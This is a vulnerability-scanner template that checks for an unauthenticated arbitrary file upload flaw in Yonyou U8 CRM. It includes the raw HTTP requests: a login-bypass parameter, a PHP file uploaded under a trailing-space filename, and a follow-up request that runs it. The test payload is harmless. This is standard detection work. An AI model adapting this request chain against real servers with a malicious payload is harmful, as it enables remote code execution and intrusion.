id: yongyou-U8-CRM-files-upload

info:
  name: 用友U8 CRM uploadfile 任意文件上传
  author: HuanXiong
  severity: critical
  description: |-
    用友U8 CRM的uploadfile接口存在任意文件上传漏洞，攻击者可以利用该漏洞上传恶意文件，进而执行任意代码。
  reference:
    - 
  tags: File Upload

http:
  - raw:
      - |
        POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----269520967239406871642430066855

        ------269520967239406871642430066855
        Content-Disposition: form-data; name="file"; filename="1.php "
        Content-Type: application/octet-stream

        <?php print(111*222);unlink(__FILE__);?>
        ------269520967239406871642430066855
        Content-Disposition: form-data; name="upload"

        upload
        ------269520967239406871642430066855--
      
      - |
        GET /tmpfile/{{uploadfile}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
       - type: regex 
         part: body
         name: uploadfile
         group: 1
         regex:
           - '(upd\w+\.tmp\.php)'
         internal: true

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code==200 && contains_all(body,'24642')"